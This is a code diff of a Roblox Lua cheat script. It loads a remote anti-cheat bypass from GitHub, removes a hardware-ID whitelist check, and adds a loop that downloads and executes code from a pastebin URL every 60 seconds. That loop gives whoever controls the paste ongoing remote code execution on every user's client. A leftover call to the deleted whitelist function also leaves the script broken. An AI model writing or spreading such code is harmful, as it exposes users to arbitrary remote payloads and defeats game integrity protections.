@@ -2,19 +2,11 @@ local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-I
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
 wait()
 
-local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
-local WhitelistedHWIDs = {"0cbb471c-11c8-4943-ae40-13cdbb90bf87"}
-local qNVAKkuwxNpqruLjSRHg = false
-
-function CheckHWID(hwidval)
-for _,whitelisted in pairs(WhitelistedHWIDs) do
- if hwidval == whitelisted then
-     return true
- elseif hwidval ~= whitelisted then
-     return false
-       end
-    end
+while true do
+task.wait(60)
+loadstring(game:HttpGet("https://pastebin.com/raw/CykKWETp"))()
 end
+
 
 qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)
 
